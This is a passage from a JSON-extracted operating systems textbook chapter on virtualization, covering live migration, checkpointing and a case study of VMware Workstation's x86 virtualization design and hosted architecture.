the virtual\r\nmachine to the new hardware as quickly as possible, configure things correctly in\r\nthe new hypervisor and then resume execution. Besides memory, we also need to\r\ntransfer storage and network connectivity, but if the machines are close, this can be\r\nrelatively fast. We could make the file system network-based to begin with (like\r\nNFS, the network file system), so that it does not matter whether your virtual ma\u0002chine is running on hardware in server rack 1 or 3. Likewise, the IP address can\r\nsimply be switched to the new location. Nevertheless, we still need to pause the\r\nmachine for a noticeable amount of time. Less time perhaps, but still noticeable.\r\nInstead, what modern virtualization solutions offer is something known as live\r\nmigration. In other words, they move the virtual machine while it is still opera\u0002tional. For instance, they employ techniques like pre-copy memory migration.\r\nThis means that they copy memory pages while the machine is still serving re\u0002quests. Most memory pages are not written much, so copying them over is safe.\r\nRemember, the virtual machine is still running, so a page may be modified after it\r\nhas already been copied. When memory pages are modified, we have to make sure\r\nthat the latest version is copied to the destination, so we mark them as dirty. They\r\nwill be recopied later. When most memory pages have been copied, we are left\r\nwith a small number of dirty pages. We now pause very briefly to copy the remain\u0002ing pages and resume the virtual machine at the new location. While there is still a\r\npause, it is so brief that applications typically are not affected. When the downtime\r\nis not noticeable, it is known as a seamless live migration."
          },
          "7.11.3 Checkpointing": {
            "page": 528,
            "content": "7.11.3 Checkpointing\r\nDecoupling of virtual machine and physical hardware has additional advan\u0002tages. In particular, we mentioned that we can pause a machine. This in itself is\r\nuseful. If the state of the paused machine (e.g., CPU state, memory pages, and stor\u0002age state) is stored on disk, we have a snapshot of a running machine. If the soft\u0002ware makes a royal mess of the still-running virtual machine, it is possible to just\r\nroll back to the snapshot and continue as if nothing happened.\r\nThe most straightforward way to make a snapshot is to copy everything, in\u0002cluding the full file system. However, copying a multiterabyte disk may take a\r\nwhile, even if it is a fast disk. And again, we do not want to pause for long while\r\nwe are doing it. The solution is to use copy on write solutions, so that data is cop\u0002ied only when absolutely necessary.\r\nSnapshotting works quite well, but there are issues. What to do if a machine is\r\ninteracting with a remote computer? We can snapshot the system and bring it up\r\nagain at a later stage, but the communicating party may be long gone. Clearly, this\r\nis a problem that cannot be solved.\n498 VIRTUALIZATION AND THE CLOUD CHAP. 7"
          }
        }
      },
      "7.12 CASE STUDY: VMWARE": {
        "page": 529,
        "children": {
          "7.12.1 The Early History of VMware": {
            "page": 529,
            "content": "7.12.1 The Early History of VMware\r\nAlthough the idea of using virtual machines was popular in the 1960s and\r\n1970s in both the computing industry and academic research, interest in virtu\u0002alization was totally lost after the 1980s and the rise of the personal computer in\u0002dustry. Only IBM’s mainframe division still cared about virtualization. Indeed, the\r\ncomputer architectures designed at the time, and in particular Intel’s x86 architec\u0002ture, did not provide architectural support for virtualization (i.e., they failed the\r\nPopek/Goldberg criteria). This is extremely unfortunate, since the 386 CPU, a\r\ncomplete redesign of the 286, was done a decade after the Popek-Goldberg paper,\r\nand the designers should have known better.\r\nIn 1997, at Stanford, three of the future founders of VMware had built a proto\u0002type hypervisor called Disco (Bugnion et al., 1997), with the goal of running com\u0002modity operating systems (in particular UNIX) on a very large scale multiproces\u0002sor then being developed at Stanford: the FLASH machine. During that project, the\r\nauthors realized that using virtual machines could solve, simply and elegantly, a\r\nnumber of hard system software problems: rather than trying to solve these prob\u0002lems within existing operating systems, one could innovate in a layer below exist\u0002ing operating systems. The key observation of Disco was that, while the high com\u0002plexity of modern operating systems made innovation difficult, the relative simpli\u0002city of a virtual machine monitor and its position in the software stack provided a\r\npowerful foothold to address limitations of operating systems. Although Disco was\r\naimed at very large servers, and designed for the MIPS architecture, the authors\r\nrealized that the same approach could equally apply, and be commercially relevant,\r\nfor the x86 marketplace.\r\nAnd so, VMware, Inc. was founded in 1998 with the goal of bringing virtu\u0002alization to the x86 architecture and the personal computer industry. VMware’s\r\nfirst product (VMware Workstation) was the first virtualization solution available\r\nfor 32-bit x86-based platforms. The product was first released in 1999, and came in\r\ntwo variants: VMware Workstation for Linux, a type 2 hypervisor that ran on top\r\nof Linux host operating systems, and VMware Workstation for Windows, which\nSEC. 7.12 CASE STUDY: VMWARE 499\r\nsimilarly ran on top of Windows NT. Both variants had identical functionality:\r\nusers could create multiple virtual machines by specifying first the characteristics\r\nof the virtual hardware (such as how much memory to give the virtual machine, or\r\nthe size of the virtual disk) and could then install the operating system of their\r\nchoice within the virtual machine, typically from the (virtual) CD-ROM.\r\nVMware Workstation was largely aimed at developers and IT professionals.\r\nBefore the introduction of virtualization, a developer routinely had two computers\r\non his desk, a stable one for development and a second one where he could rein\u0002stall the system software as needed. With virtualization, the second test system\r\nbecame a virtual machine.\r\nSoon, VMware started developing a second and more complex product, which\r\nwould be released as ESX Server in 2001. ESX Server leveraged the same virtu\u0002alization engine as VMware Workstation, but packaged it as part of a type 1 hyper\u0002visor. In other words, ESX Server ran directly on the hardware without requiring a\r\nhost operating system. The ESX hypervisor was designed for intense workload\r\nconsolidation and contained many optimizations to ensure that all resources (CPU,\r\nmemory, and I/O) were efficiently and fairly allocated among the virtual machines.\r\nFor example, it was the first to introduce the concept of ballooning to rebalance\r\nmemory between virtual machines (Waldspurger, 2002).\r\nESX Server was aimed at the server consolidation market. Before the introduc\u0002tion of virtualization, IT administrators would typically buy, install, and configure\r\na new server for every new task or application that they had to run in the data cen\u0002ter. The result wasthat the infrastructure was very inefficiently utilized: servers at\r\nthe time were typically used at 10% of their capacity (during peaks). With ESX\r\nServer, IT administrators could consolidate many independent virtual machines\r\ninto a single server, saving time, money, rack space, and electrical power.\r\nIn 2002, VMware introduced its first management solution for ESX Server,\r\noriginally called Virtual Center, and today called vSphere. It provided a single\r\npoint of management for a cluster of servers running virtual machines: an IT\r\nadministrator could now simply log into the Virtual Center application and control,\r\nmonitor, or provision thousands of virtual machines running throughout the enter\u0002prise. With Virtual Center came another critical innovation, VMotion (Nelson et\r\nal., 2005), which allowed the live migration of a running virtual machine over the\r\nnetwork. For the first time, an IT administrator could move a running computer\r\nfrom one location to another without having to reboot the operating system, restart\r\napplications, or even lose network connections."
          },
          "7.12.2 VMware Workstation": {
            "page": 530,
            "content": "7.12.2 VMware Workstation\r\nVMware Workstation was the first virtualization product for 32-bit x86 com\u0002puters. The subsequent adoption of virtualization had a profound impact on the in\u0002dustry and on the computer science community: in 2009, the ACM awarded its\n500 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nauthors the ACM Software System Award for VMware Workstation 1.0 for Lin\u0002ux. The original VMware Workstation is described in a detailed technical article\r\n(Bugnion et al., 2012). Here we provide a summary of that paper.\r\nThe idea was that a virtualization layer could be useful on commodity plat\u0002forms built from x86 CPUs and primarily running the Microsoft Windows operat\u0002ing systems (a.k.a. the WinTel platform). The benefits of virtualization could help\r\naddress some of the known limitations of the WinTel platform, such as application\r\ninteroperability, operating system migration, reliability, and security. In addition,\r\nvirtualization could easily enable the coexistence of operating system alternatives,\r\nin particular, Linux.\r\nAlthough there existed decades’ worth of research and commercial develop\u0002ment of virtualization technology on mainframes, the x86 computing environment\r\nwas sufficiently different that new approaches were necessary. For example, main\u0002frames were vertically integrated, meaning that a single vendor engineered the\r\nhardware, the hypervisor, the operating systems, and most of the applications.\r\nIn contrast, the x86 industry was (and still is) disaggregated into at least four\r\ndifferent categories: (a) Intel and AMD make the processors; (b) Microsoft offers\r\nWindows and the open source community offers Linux; (c) a third group of com\u0002panies builds the I/O devices and peripherals and their corresponding device driv\u0002ers; and (d) a fourth group of system integrators such as HP and Dell put together\r\ncomputer systems for retail sale. For the x86 platform, virtualization would first\r\nneed to be inserted without the support of any of these industry players.\r\nBecause this disaggregation was a fact of life, VMware Workstation differed\r\nfrom classic virtual machine monitors that were designed as part of single-vendor\r\narchitectures with explicit support for virtualization. Instead, VMware Workstation\r\nwas designed for the x86 architecture and the industry built around it. VMware\r\nWorkstation addressed these new challenges by combining well-known virtu\u0002alization techniques, techniques from other domains, and new techniques into a\r\nsingle solution.\r\nWe now discuss the specific technical challenges in building VMware Work\u0002station."
          },
          "7.12.3 Challenges in Bringing Virtualization to the x86": {
            "page": 531,
            "content": "7.12.3 Challenges in Bringing Virtualization to the x86\r\nRecall our definition of hypervisors and virtual machines: hypervisors apply\r\nthe well-known principle of adding a level of indirection to the domain of com\u0002puter hardware. They provide the abstraction of virtual machines: multiple copies\r\nof the underlying hardware, each running an independent operating system\r\ninstance. The virtual machines are isolated from other virtual machines, appear\r\neach as a duplicate of the underlying hardware, and ideally run with the same\r\nspeed as the real machine. VMware adapted these core attributes of a virtual ma\u0002chine to an x86-based target platform as follows:\nSEC. 7.12 CASE STUDY: VMWARE 501\r\n1. Compatibility. The notion of an ‘‘essentially identical environment’’\r\nmeant that any x86 operating system, and all of its applications,\r\nwould be able to run without modifications as a virtual machine. A\r\nhypervisor needed to provide sufficient compatibility at the hardware\r\nlevel such that users could run whichever operating system, (down to\r\nthe update and patch version), they wished to install within a particu\u0002lar virtual machine, without restrictions.\r\n2. Performance. The overhead of the hypervisor had to be sufficiently\r\nlow that users could use a virtual machine as their primary work envi\u0002ronment. As a goal, the designers of VMware aimed to run relevant\r\nworkloads at near native speeds, and in the worst case to run them on\r\nthen-current processors with the same performance as if they were\r\nrunning natively on the immediately prior generation of processors.\r\nThis was based on the observation that most x86 software was not de\u0002signed to run only on the latest generation of CPUs.\r\n3. Isolation. A hypervisor had to guarantee the isolation of the virtual\r\nmachine without making any assumptions about the software running\r\ninside. That is, a hypervisor needed to be in complete control of re\u0002sources. Software running inside virtual machines had to be pre\u0002vented from any access that would allow it to subvert the hypervisor.\r\nSimilarly, a hypervisor had to ensure the privacy of all data not be\u0002longing to the virtual machine. A hypervisor had to assume that the\r\nguest operating system could be infected with unknown, malicious\r\ncode (a much bigger concern today than during the mainframe era).\r\nThere was an inevitable tension between these three requirements. For ex\u0002ample, total compatibility in certain areas might lead to a prohibitive impact on\r\nperformance, in which case VMware’s designers had to compromise. However,\r\nthey ruled out any trade-offs that might compromise isolation or expose the hyper\u0002visor to attacks by a malicious guest. Overall, four major challenges emerged:\r\n1. The x86 architecture was not virtualizable. It contained virtu\u0002alization-sensitive, nonprivileged instructions, which violated the\r\nPopek and Goldberg criteria for strict virtualization. For example, the\r\nPOPF instruction has a different (yet nontrapping) semantics depend\u0002ing on whether the currently running software is allowed to disable\r\ninterrupts or not. This ruled out the traditional trap-and-emulate ap\u0002proach to virtualization. Even engineers from Intel Corporation were\r\nconvinced their processors could not be virtualized in any practical\r\nsense.\r\n2. The x86 architecture was of daunting complexity. The x86 archi\u0002tecture was a notoriously complicated CISC architecture, including\n502 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nlegacy support for multiple decades of backward compatibility. Over\r\nthe years, it had introduced four main modes of operations (real, pro\u0002tected, v8086, and system management), each of which enabled in\r\ndifferent ways the hardware’s segmentation model, paging mechan\u0002isms, protection rings, and security features (such as call gates).\r\n3. x86 machines had diverse peripherals. Although there were only\r\ntwo major x86 processor vendors, the personal computers of the time\r\ncould contain an enormous variety of add-in cards and devices, each\r\nwith their own vendor-specific device drivers. Virtualizing all these\r\nperipherals was infeasible. This had dual implications: it applied to\r\nboth the front end (the virtual hardware exposed in the virtual ma\u0002chines) and the back end (the real hardware that the hypervisor need\u0002ed to be able to control) of peripherals.\r\n4. Need for a simple user experience. Classic hypervisors were in\u0002stalled in the factory, similar to the firmware found in today’s com\u0002puters. Since VMware was a startup, its users would have to add the\r\nhypervisors to existing systems after the fact. VMware needed a soft\u0002ware delivery model with a simple installation experience to encour\u0002age adoption."
          },
          "7.12.4 VMware Workstation: Solution Overview": {
            "page": 533,
            "content": "7.12.4 VMware Workstation: Solution Overview\r\nThis section describes at a high level how VMware Workstation addressed the\r\nchallenges mentioned in the previous section.\r\nVMware Workstation is a type 2 hypervisor that consists of distinct modules.\r\nOne important module is the VMM, which is responsible for executing the virtual\r\nmachine’s instructions. A second important module is the VMX, which interacts\r\nwith the host operating system.\r\nThe section covers first how the VMM solves the nonvirtualizability of the x86\r\narchitecture. Then, we describe the operating system-centric strategy used by the\r\ndesigners throughout the development phase. After that, we describe the design of\r\nthe virtual hardware platform, which addresses one-half of the peripheral diversity\r\nchallenge. Finally, we discuss the role of the host operating system in VMware\r\nWorkstation, and in particular the interaction between the VMM and VMX compo\u0002nents.\r\nVirtualizing the x86 Architecture\r\nThe VMM runs the actual virtual machine; it enables it to make forward\r\nprogress. A VMM built for a virtualizable architecture uses a technique known as\r\ntrap-and-emulate to execute the virtual machine’s instruction sequence directly, but\nSEC. 7.12 CASE STUDY: VMWARE 503\r\nsafely, on the hardware. When this is not possible, one approach is to specify a vir\u0002tualizable subset of the processor architecture, and port the guest operating systems\r\nto that newly defined platform. This technique is known as paravirtualization\r\n(Barham et al., 2003; Whitaker et al., 2002) and requires source-code level modifi\u0002cations of the operating system. Put bluntly, paravirtualization modifies the guest\r\nto avoid doing anything that the hypervisor cannot handle. Paravirtualization was\r\ninfeasible at VMware because of the compatibility requirement and the need to run\r\noperating systems whose source code was not available, in particular Windows.\r\nAn alternative would have been to employ an all-emulation approach. In this,\r\nthe instructions of the virtual machines are emulated by the VMM on the hardware\r\n(rather than directly executed). This can be quite efficient; prior experience with\r\nthe SimOS (Rosenblum et al., 1997) machine simulator showed that the use of\r\ntechniques such as dynamic binary translation running in a user-level program\r\ncould limit overhead of complete emulation to a factor-of-fiv e slowdown. Although\r\nthis is quite efficient, and certainly useful for simulation purposes, a factor-of-fiv e\r\nslowdown was clearly inadequate and would not meet the desired performance re\u0002quirements.\r\nThe solution to this problem combined two key insights. First, although trap\u0002and-emulate direct execution could not be used to virtualize the entire x86 archi\u0002tecture all the time, it could actually be used some of the time. In particular, it\r\ncould be used during the execution of application programs, which accounted for\r\nmost of the execution time on relevant workloads. The reasons is that these virtu\u0002alization sensitive instructions are not sensitive all the time; rather they are sensi\u0002tive only in certain circumstances. For example, the POPF instruction is virtu\u0002alization-sensitive when the software is expected to be able to disable interrupts\r\n(e.g., when running the operating system), but is not virtualization-sensitive when\r\nsoftware cannot disable interrupts (in practice, when running nearly all user-level\r\napplications).\r\nFigure 7-8 shows the modular building blocks of the original VMware VMM.\r\nWe see that it consists of a direct-execution subsystem, a binary translation subsys\u0002tem, and a decision algorithm to determine which subsystem should be used. Both\r\nsubsystems rely on some shared modules, for example to virtualize memory\r\nthrough shadow page tables, or to emulate I/O devices.\r\nThe direct-execution subsystem is preferred, and the dynamic binary transla\u0002tion subsystem provides a fallback mechanism whenever direct execution is not\r\npossible. This is the case for example whenever the virtual machine is in such a\r\nstate that it could issue a virtualization-sensitive instruction. Therefore, each\r\nsubsystem constantly reevaluates the decision algorithm to determine whether a\r\nswitch of subsystems is possible (from binary translation to direct execution) or\r\nnecessary (from direct execution to binary translation). This algorithm has a num\u0002ber of input parameters, such as the current execution ring of the virtual machine,\r\nwhether interrupts can be enabled at that level, and the state of the segments. For\r\nexample, binary translation must be used if any of the following is true:\n504 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nVMM\r\nShared modules\r\n(shadow MMU, I/O handling, …)\r\nDirect Execution Binary translation\r\nDecision\r\nAlg.\r\nFigure 7-8. High-level components of the VMware virtual machine monitor (in\r\nthe absence of hardware support).\r\n1. The virtual machine is currently running in kernel mode (ring 0 in the\r\nx86 architecture).\r\n2. The virtual machine can disable interrupts and issue I/O instructions\r\n(in the x86 architecture, when the I/O privilege level is set to the ring\r\nlevel).\r\n3. The virtual machine is currently running in real mode, a legacy 16-bit\r\nexecution mode used by the BIOS among other things.\r\nThe actual decision algorithm contains a few additional conditions. The details\r\ncan be found in Bugnion et al. (2012). Interestingly, the algorithm does not depend\r\non the instructions that are stored in memory and may be executed, but only on the\r\nvalue of a few virtual registers; therefore it can be evaluated very efficiently in just\r\na handful of instructions.\r\nThe second key insight was that by properly configuring the hardware, particu\u0002larly using the x86 segment protection mechanisms carefully, system code under\r\ndynamic binary translation could also run at near-native speeds. This is very dif\u0002ferent than the factor-of-fiv e slowdown normally expected of machine simulators.\r\nThe difference can be explained by comparing how a dynamic binary translator\r\nconverts a simple instruction that accesses memory. To emulate such an instruction\r\nin software, a classic binary translator emulating the full x86 instruction-set archi\u0002tecture would have to first verify whether the effective address is within the range\r\nof the data segment, then convert the address into a physical address, and finally to\r\ncopy the referenced word into the simulated register. Of course, these various steps\r\ncan be optimized through caching, in a way very similar to how the processor\r\ncached page-table mappings in a translation-lookaside buffer. But even such opti\u0002mizations would lead to an expansion of individual instructions into an instruction\r\nsequence.\r\nThe VMware binary translator performs none of these steps in software. In\u0002stead, it configures the hardware so that this simple instruction can be reissued\nSEC. 7.12 CASE STUDY: VMWARE 505\r\nwith the identical instruction. This is possible only because the VMware VMM (of\r\nwhich the binary translator is a component) has previously configured the hard\u0002ware to match the exact specification of the virtual machine: (a) the VMM uses\r\nshadow page tables, which ensures that the memory management unit can be used\r\ndirectly (rather than emulated) and (b) the VMM uses a similar shadowing ap\u0002proach to the segment descriptor tables (which played a big role in the 16-bit and\r\n32-bit software running on older x86 operating systems).\r\nThere are, of course, complications and subtleties. One important aspect of the\r\ndesign is to ensure the integrity of the virtualization sandbox, that is, to ensure that\r\nno software running inside the virtual machine (including malicious software) can\r\ntamper with the VMM. This problem is generally known as software fault isola\u0002tion and adds run-time overhead to each memory access if the solution is imple\u0002mented in software. Here also, the VMware VMM uses a different, hardware-based\r\napproach. It splits the address space into two disjoint zones. The VMM reserves\r\nfor its own use the top 4 MB of the address space. This frees up the rest (that is, 4\r\nGB − 4 MB, since we are talking about a 32-bit architecture) for the use by the vir\u0002tual machine. The VMM then configures the segmentation hardware so that no vir\u0002tual machine instructions (including ones generated by the binary translator) can\r\nev er access the top 4-MB region of the address space.\r\nA Guest Operating System Centric Strategy\r\nIdeally, a VMM should be designed without worrying about the guest operat\u0002ing system running in the virtual machine, or how that guest operating system con\u0002figures the hardware. The idea behind virtualization is to make the virtual machine\r\ninterface identical to the hardware interface so that all software that runs on the\r\nhardware will also run in a virtual machine. Unfortunately, this approach is practi\u0002cal only when the architecture is virtualizeable and simple. In the case of x86, the\r\noverwhelming complexity of the architecture was clearly a problem.\r\nThe VMware engineers simplified the problem by focusing only on a selection\r\nof supported guest operating systems. In its first release, VMware Workstation sup\u0002ported officially only Linux, Windows 3.1, Windows 95/98 and Windows NT as\r\nguest operating systems. Over the years, new operating systems were added to the\r\nlist with each revision of the software. Nevertheless, the emulation was good\r\nenough that it ran some unexpected operating systems, such as MINIX 3, perfectly,\r\nright out of the box.\r\nThis simplification did not change the overall design—the VMM still provided\r\na faithful copy of the underlying hardware, but it helped guide the development\r\nprocess. In particular, engineers had to worry only about combinations of features\r\nthat were used in practice by the supported guest operating systems.\r\nFor example, the x86 architecture contains four privilege rings in protected\r\nmode (ring 0 to ring 3) but no operating system uses ring 1 or ring 2 in practice\r\n(save for OS/2, a long-dead operating system from IBM). So rather than figure out\n506 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nhow to correctly virtualize ring 1 and ring 2, the VMware VMM simply had code\r\nto detect if a guest was trying to enter into ring 1 or ring 2, and, in that case, would\r\nabort execution of the virtual machine. This not only removed unnecessary code,\r\nbut more importantly it allowed the VMware VMM to assume that ring 1 and ring\r\n2 would never be used by the virtual machine, and therefore that it could use these\r\nrings for its own purposes. In fact, the VMware VMM’s binary translator runs at\r\nring 1 to virtualize ring 0 code.\r\nThe Virtual Hardware Platform\r\nSo far, we hav e primarily discussed the problem associated with the virtu\u0002alization of the x86 processor. But an x86-based computer is much more than its\r\nprocessor. It also has a chipset, some firmware, and a set of I/O peripherals to con\u0002trol disks, network cards, CD-ROM, keyboard, etc.\r\nThe diversity of I/O peripherals in x86 personal computers made it impossible\r\nto match the virtual hardware to the real, underlying hardware. Whereas there were\r\nonly a handful of x86 processor models in the market, with only minor variations\r\nin instruction-set level capabilities, there were thousands of I/O devices, most of\r\nwhich had no publicly available documentation of their interface or functionality.\r\nVMware’s key insight was to not attempt to have the virtual hardware match the\r\nspecific underlying hardware, but instead have it always match some configuration\r\ncomposed of selected, canonical I/O devices. Guest operating systems then used\r\ntheir own existing, built-in mechanisms to detect and operate these (virtual) de\u0002vices.\r\nThe virtualization platform consisted of a combination of multiplexed and\r\nemulated components. Multiplexing meant configuring the hardware so it can be\r\ndirectly used by the virtual machine, and shared (in space or time) across multiple\r\nvirtual machines. Emulation meant exporting a software simulation of the selected,\r\ncanonical hardware component to the virtual machine. Figure 7-9 shows that\r\nVMware Workstation used multiplexing for processor and memory and emulation\r\nfor everything else.\r\nFor the multiplexed hardware, each virtual machine had the illusion of having\r\none dedicated CPU and a configurable, but a fixed amount of contiguous RAM\r\nstarting at physical address 0.\r\nArchitecturally, the emulation of each virtual device was split between a front\u0002end component, which was visible to the virtual machine, and a back-end compo\u0002nent, which interacted with the host operating system (Waldspurger and Rosen\u0002blum, 2012). The front-end was essentially a software model of the hardware de\u0002vice that could be controlled by unmodified device drivers running inside the virtu\u0002al machine. Regardless of the specific corresponding physical hardware on the\r\nhost, the front end always exposed the same device model.\r\nFor example, the first Ethernet device front end was the AMD PCnet ‘‘Lance’’\r\nchip, once a popular 10-Mbps plug-in board on PCs, and the back end provided\nSEC. 7.12 CASE STUDY: VMWARE 507\r\nVirtual Hardware (front end) Back end\r\n1 virtual x86 CPU, with the same\r\ninstruction set extensions as the un\u0002derlying hardware CUP\r\nUp to 512 MB of contiguous DRAM\r\nMultiplexed Emulated\r\nPCI Bus\r\nScheduled by the host operating system on\r\neither a uniprocessor or multiprocessor host\r\nAllocated and managed by the host OS\r\n(page-by-page)\r\nFully emulated compliant PCI bus\r\nVirtual disks (stored as files) or direct access\r\nto a given raw device\r\nISO image or emulated access to the real\r\nCD-ROM\r\nPhysical floppy or floppy image\r\nRan in a window and in full-screen mode.\r\nSVGA required VMware SVGA guest driver\r\n4x IDE disks\r\n7x Buslogic SCSI Disks\r\n1x IDE CD-ROM\r\n2x 1.44 MB floppy drives\r\n1x VMware graphics card with VGA\r\nand SVGA support\r\n2x serial ports COM1 and COM2\r\n1x printer (LPT)\r\n1x keyboard (104-key)\r\n1x PS-2 mouse\r\n3x AMD Lance Ethernet cards\r\n1x Soundblaster\r\nConnect to host serial port or a file\r\nCan connect to host LPT port\r\nFully emulated; keycode events are gen\u0002erated when they are received by the VMware\r\napplication\r\nSame as keyboard\r\nBridge mode and host-only modes\r\nFully emulated\r\nFigure 7-9. Virtual hardware configuration options of the early VMware\r\nWorkstation, ca. 2000.\r\nnetwork connectivity to the host’s physical network. Ironically, VMware kept sup\u0002porting the PCnet device long after physical Lance boards were no longer avail\u0002able, and actually achieved I/O that was orders of magnitude faster than 10 Mbps\r\n(Sugerman et al., 2001). For storage devices, the original front ends were an IDE\r\ncontroller and a Buslogic Controller, and the back end was typically either a file in\r\nthe host file system, such as a virtual disk or an ISO 9660 image, or a raw resource\r\nsuch as a drive partition or the physical CD-ROM.\r\nSplitting front ends from back ends had another benefit: a VMware virtual ma\u0002chine could be copied from computer to another computer, possibly with different\r\nhardware devices. Yet, the virtual machine would not have to install new device\r\ndrivers since it only interacted with the front-end component. This attribute, called\r\nhardware-independent encapsulation, has a huge benefit today in server envi\u0002ronments and in cloud computing. It enabled subsequent innovations such as sus\u0002pend/resume, checkpointing, and the transparent migration of live virtual machines\n508 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nacross physical boundaries (Nelson et al., 2005). In the cloud, it allows customers\r\nto deploy their virtual machines on any available server, without having to worry of\r\nthe details of the underlying hardware.\r\nThe Role of the Host Operating System\r\nThe final critical design decision in VMware Workstation was to deploy it ‘‘on\r\ntop’’ of an existing operating system. This classifies it as a type 2 hypervisor. The\r\nchoice had two main benefits.\r\nFirst, it would address the second part of peripheral diversity challenge.\r\nVMware implemented the front-end emulation of the various devices, but relied on\r\nthe device drivers of the host operating system for the back end. For example,\r\nVMware Workstation would read or write a file in the host file system to emulate a\r\nvirtual disk device, or draw in a window of the host’s desktop to emulate a video\r\ncard. As long as the host operating system had the appropriate drivers, VMware\r\nWorkstation could run virtual machines on top of it.\r\nSecond, the product could install and feel like a normal application to a user,\r\nmaking adoption easier. Like any application, the VMware Workstation installer\r\nsimply writes its component files onto an existing host file system, without per\u0002turbing the hardware configuration (no reformatting of a disk, creating of a disk\r\npartition, or changing of BIOS settings). In fact, VMware Workstation could be in\u0002stalled and start running virtual machines without requiring even rebooting the host\r\noperating system, at least on Linux hosts.\r\nHowever, a normal application does not have the necessary hooks and APIs\r\nnecessary for a hypervisor to multiplex the CPU and memory resources, which is\r\nessential to provide near-native performance. In particular, the core x86 virtu\u0002alization technology described above works only when the VMM runs in kernel\r\nmode and can furthermore control all aspects of the processor without any restric\u0002tions. This includes the ability to change the address space (to create shadow page\r\ntables), to change the segment tables, and to change all interrupt and exception\r\nhandlers.\r\nA device driver has more direct access to the hardware, in particular if it runs\r\nin kernel mode. Although it could (in theory) issue any privileged instructions, in\r\npractice a device driver is expected to interact with its operating system using\r\nwell-defined APIs, and does not (and should never) arbitrarily reconfigure the\r\nhardware. And since hypervisors call for a massive reconfiguration of the hardware\r\n(including the entire address space, segment tables, exception and interrupt hand\u0002lers), running the hypervisor as a device driver was also not a realistic option.\r\nSince none of these assumptions are supported by host operating systems, run\u0002ning the hypervisor as a device driver (in kernel mode) was also not an option.\r\nThese stringent requirements led to the development of the VMware Hosted\r\nArchitecture. In it, as shown in Fig. 7-10, the software is broken into three sepa\u0002rate and distinct components.\nSEC. 7.12 CASE STUDY: VMWARE 509\r\nCPU\r\nHost OS Context VMM Context\r\nKernel mode User mode\r\nDisk\r\nint handler int handler\r\nIDTR\r\nAny\r\nProc.\r\nHost OS write()\r\nfs\r\nscsi VMM\r\nDriver\r\nworld\r\nswitch\r\nVMM\r\nVMX Virtual Machine\r\n(i)\r\n(ii)\r\n(iii)\r\n(iv)\r\n(v)\r\nFigure 7-10. The VMware Hosted Architecture and its three components: VMX,\r\nVMM driver and VMM.\r\nThese components each have different functions and operate independently\r\nfrom one another:\r\n1. A user-space program (the VMX) which the user perceives to be the\r\nVMware program. The VMX performs all UI functions, starts the vir\u0002tual machine, and then performs most of the device emulation (front\r\nend), and makes regular system calls to the host operating system for\r\nthe back end interactions. There is typically one multithreaded VMX\r\nprocess per virtual machine.\r\n2. A small kernel-mode device driver (the VMX driver), which gets in\u0002stalled within the host operating system. It is used primarily to allow\r\nthe VMM to run by temporarily suspending the entire host operating\r\nsystem. There is one VMX driver installed in the host operating sys\u0002tem, typically at boot time.\r\n3. The VMM, which includes all the software necessary to multiplex the\r\nCPU and the memory, including the exception handlers, the trap-and\u0002emulate handlers, the binary translator, and the shadow paging mod\u0002ule. The VMM runs in kernel mode, but it does not run in the context\r\nof the host operating system. In other words, it cannot rely directly on\r\nservices offered by the host operating system, but it is also not con\u0002strained by any rules or conventions imposed by the host operating\r\nsystem. There is one VMM instance for each virtual machine, created\r\nwhen the virtual machine starts.\n510 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nVMware Workstation appears to run on top of an existing operating system,\r\nand, in fact, its VMX does run as a process of that operating system. However, the\r\nVMM operates at system level, in full control of the hardware, and without de\u0002pending on any way on the host operating system. Figure 7-10 shows the relation\u0002ship between the entities: the two contexts (host operating system and VMM) are\r\npeers to each other, and each has a user-level and a kernel component. When the\r\nVMM runs (the right half of the figure), it reconfigures the hardware, handles all\r\nI/O interrupts and exceptions, and can therefore safely temporarily remove the host\r\noperating system from its virtual memory. For example, the location of the inter\u0002rupt table is set within the VMM by assigning the IDTR register to a new address.\r\nConversely, when the host operating system runs (the left half of the figure), the\r\nVMM and its virtual machine are equally removed from its virtual memory.\r\nThis transition between these two totally independent system-level contexts is\r\ncalled a world switch. The name itself emphasizes that everything about the soft\u0002ware changes during a world switch, in contrast with the regular context switch im\u0002plemented by an operating system. Figure 7-11 shows the difference between the\r\ntwo. The regular context switch between processes ‘‘A’’ and ‘‘B’’ swaps the user\r\nportion of the address space and the registers of the two processes, but leaves a\r\nnumber of critical system resources unmodified. For example, the kernel portion of\r\nthe address space is identical for all processes, and the exception handlers are also\r\nnot modified. In contrast, the world switch changes everything: the entire address\r\nspace, all exception handlers, privileged registers, etc. In particular, the kernel ad\u0002dress space of the host operating system is mapped only when running in the host\r\noperating system context. After the world switch into the VMM context, it has\r\nbeen removed from the address space altogether, freeing space to run both the\r\nVMM and the virtual machine. Although this sounds complicated, this can be im\u0002plemented quite efficiently and takes only 45 x86 machine-language instructions to\r\nexecute.\r\nHost OS\r\nContext\r\nProcess\r\nA\r\nProcess\r\nB\r\nNormal\r\nContext Switch\r\nVMware\r\nWorld Switch\r\nVMM\r\nContext\r\nLinear Address space\r\nVMM\r\nA (user-space) Kernel Address space\r\nB (user-space)\r\nVMX (user-space)\r\nKernel Address space\r\nKernel Address space (host OS)\r\nVirtual Machine\r\nFigure 7-11. Difference between a normal context switch and a world switch.\nSEC. 7.12 CASE STUDY: VMWARE 511\r\nThe careful reader will have wondered: what of the guest operating system’s\r\nkernel address space? The answer is simply that it is part of the virtual machine ad\u0002dress space, and is present when running in the VMM context. Therefore, the guest\r\noperating system can use the entire address space, and in particular the same loca\u0002tions in virtual memory as the host operating system. This is very specifically what\r\nhappens when the host and guest operating systems are the same (e.g., both are\r\nLinux). Of course, this all ‘‘just works’’ because of the two independent contexts\r\nand the world switch between the two.\r\nThe same reader will then wonder: what of the VMM area, at the very top of\r\nthe address space? As we discussed above, it is reserved for the VMM itself, and\r\nthose portions of the address space cannot be directly used by the virtual machine.\r\nLuckily, that small 4-MB portion is not frequently used by the guest operating sys\u0002tems since each access to that portion of memory must be individually emulated\r\nand induces noticeable software overhead.\r\nGoing back to Fig. 7-10: it further illustrates the various steps that occur when\r\na disk interrupt happens while the VMM is executing (step i). Of course, the VMM\r\ncannot handle the interrupt since it does not have the back-end device driver. In\r\n(ii), the VMM does a world switch back to the host operating system. Specifically,\r\nthe 